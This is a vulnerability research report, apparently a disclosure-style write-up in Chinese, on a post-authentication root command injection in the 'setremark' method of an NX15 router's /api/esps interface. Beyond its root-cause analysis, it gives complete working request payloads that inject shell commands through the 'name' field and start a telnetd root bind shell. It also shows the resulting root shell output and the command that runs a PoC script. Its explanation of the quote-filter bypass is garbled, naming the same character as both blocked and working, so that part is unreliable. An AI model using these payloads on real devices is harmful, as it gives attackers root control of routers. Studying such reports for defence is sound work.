# NX15 R017 `esps.sta.setremark` 后置独立 root RCE

## 1. 结论

在 NX15 R017 上，`/api/esps` 的：

- `object = esps.sta`
- `method = setremark`

存在一条**新的、独立的、即时触发型后认证 root RCE**。

- **接口**：`POST /api/esps`
- **对象**：`esps.sta`
- **方法**：`setremark`
- **注入点**：`name`
- **权限**：后认证（管理员会话）
- **结果**：以 **root** 权限执行任意命令
- **验证设备**：`192.168.8.1`，NX15 firmware `R017`
- **结论等级**：**Confirmed / Exploited**

这条链的价值非常高，因为它不是“包装调用下游对象才碰巧出命令执行”，而是：

1. `setremark` 自身存在危险 `eval`；
2. 利用时**不需要合法 MAC**；
3. 即便把 `mac` 设置成 `NOT_A_MAC`，仍可直接拉起 root shell。

这说明其 root cause 在 `esps.sta.setremark` 本身，而不是下游 `esps.macfilter.modify` 的业务逻辑。

---

## 2. 根因分析

目标脚本：

- `/usr/libexec/rpcd/esps.sta`

### 2.1 `setremark` 总是进入危险分支

代码：

```sh
userfilter=$(uci get ability.macfilter.newforbidden) || userfilter=0
...
if [ "$userfilter" == "1" ]; then
    ...
fi
```

这里读取的不是运行时开关 `userfilter.basicinfo.enable`，
而是能力配置 `ability.macfilter.newforbidden`。

在 NX15 R017 固件中：

```sh
etc/config/ability:
option newforbidden '1'
```

因此 `setremark` 在当前设备上**始终走危险分支**，
与“禁止新用户上网”功能是否启用无关。

### 2.2 `name` 被拼进 JSON，再被单引号包裹进 `eval`

在危险分支里：

```sh
json_get_var _mac mac
json_get_var _name name
...
strJson=$(joint_json "$_mac" "$_name" "$netStat")
para="'"$strJson"'"
eval ubus call esps.macfilter modify "$para"
```

其中 `joint_json()` 定义为：

```sh
joint_json()
{
    json_init
    json_add_string "mac" "$1"
    json_add_string "description" "$2"
    json_add_string "internet" "$3"
    json_dump
}
```

也就是说：
- 攻击者控制的 `name` 会被作为 JSON `description` 字段进入 `strJson`；
- 随后整段 `strJson` 被 `para='...json...'` 再用**单引号**包住；
- 最后送进 `eval ubus call esps.macfilter modify "$para"`。

这正是典型的：

> **JSON 字符串 + shell 单引号包装 + eval 二次解析**

一旦 `name` 中有真实单引号，就可以直接打断 `para='...` 的 shell 引号上下文，执行攻击者命令。

### 2.3 为什么 `'` 能稳定利用

直接原始单引号请求会被 `/api/esps` 外层过滤，返回：

```json
{"code":21,"message":"'"}
```

但如果在 raw JSON body 中使用：

```json
"name":"x';...;#"
```

那么：
- 外层原始字符过滤不会直接命中；
- JSON 解析完成后，脚本变量 `_name` 中已经是真实单引号；
- 该单引号在 `eval ubus call esps.macfilter modify "$para"` 里打断 shell 语义，从而执行 payload。

---

## 3. 关键静态证据

### 3.1 能力开关决定危险分支总是在线

```sh
userfilter=$(uci get ability.macfilter.newforbidden) || userfilter=0
if [ "$userfilter" == "1" ]; then
    ...
fi
```

### 3.2 `name` 进入 `joint_json`

```sh
json_get_var _name name
strJson=$(joint_json "$_mac" "$_name" "$netStat")
```

### 3.3 整段 JSON 再被单引号包裹

```sh
para="'"$strJson"'"
```

### 3.4 `eval` 触发命令执行

```sh
eval ubus call esps.macfilter modify "$para"
```

---

## 4. 利用方式

### 4.1 直接原始单引号会被外层挡住

请求：

```json
[
  {
    "id": 1,
    "object": "esps.sta",
    "method": "setremark",
    "param": {
      "mac": "BADMAC2",
      "name": "n';echo DIRQ2_OK >/tmp/dirq2_ok;/usr/sbin/telnetd -p 2478 -l /bin/sh >/dev/null 2>&1;#"
    }
  }
]
```

返回：

```json
{"code":21,"message":"'"}
```

### 4.2 使用 `'` 后，非法 MAC 也能打通 root RCE

成功请求示例：

```json
[
  {
    "id": 1,
    "object": "esps.sta",
    "method": "setremark",
    "param": {
      "mac": "NOT_A_MAC",
      "name": "k';echo STABADMAC_OK >/tmp/stabadmac_ok;/usr/sbin/telnetd -p 2476 -l /bin/sh >/dev/null 2>&1;#"
    }
  }
]
```

这条请求中：
- `mac` 故意使用非法值 `NOT_A_MAC`；
- 若命令执行仍成功，就能证明**漏洞发生在 `setremark` 自己的 `eval` 里**，而不是后续 MAC 处理逻辑中。

---

## 5. 动态验证

### 5.1 `setremark` 对非法 MAC 也能直接命中

请求：

```json
[
  {
    "id": 1,
    "object": "esps.sta",
    "method": "setremark",
    "param": {
      "mac": "NOT_A_MAC",
      "name": "k';echo STABADMAC_OK >/tmp/stabadmac_ok;/usr/sbin/telnetd -p 2476 -l /bin/sh >/dev/null 2>&1;#"
    }
  }
]
```

返回：

```json
[{"id":1,"result":{"mac":"NOT_A_MAC","name":"k';echo STABADMAC_OK >/tmp/stabadmac_ok;/usr/sbin/telnetd -p 2476 -l /bin/sh >/dev/null 2>&1;#"}}]
```

返回体已经明显偏离原始预期格式，说明 shell 语义已被破坏。

### 5.2 Root shell 证明

随后连接 `192.168.8.1:2476`，得到：

```text
BusyBox v1.30.1 (2025-08-01 14:05:52 CST) built-in shell (ash)
/ # id; uname -a; cat /tmp/stabadmac_ok 2>/dev/null
uid=0(root) gid=0(root)
Linux NX15 4.4.176-svn22943 #2 Fri Aug 1 14:14:03 CST 2025 mips GNU/Linux
STABADMAC_OK
```

这直接证明：
- 命令执行发生在 root 上下文；
- 且与后续 MAC 合法性约束无关。

## 6. 风险评估

成功利用后，攻击者可：

- 以 root 身份执行任意命令
- 在设备当前联网状态下直接植入后门
- 无需先准备合法业务对象或现有终端条目

由于利用不依赖合法 MAC，攻击成本比许多业务型注入更低。

---

## 7. POC

已落地 POC：

- `poc/postauth_esps_sta_setremark_rce.py`

运行示例：

```bash
python3 poc/postauth_esps_sta_setremark_rce.py --cleanup --port 2476
```

POC 默认直接使用：

- `--mac NOT_A_MAC`

以突出证明这是 `setremark` 自己的 wrapper-level `eval` 命令注入。

---

## 8. 结论

`esps.sta.setremark` 提供了一条新的**即时型后认证 root RCE**。根因是：

- 能力开关 `ability.macfilter.newforbidden=1` 使危险分支始终在线；
- `name` 被写入 JSON 字符串；
- 整段 JSON 又被 `para='...json...'` 的 shell 单引号包裹；
- 随后进入 `eval ubus call esps.macfilter modify "$para"`；
- `'` 能绕过外层过滤并在 `eval` 中形成真实的 shell breakout。

更重要的是：**非法 MAC 也能成功命令执行**，说明它的 root cause 在 `setremark` 自身，而不是下游业务逻辑。
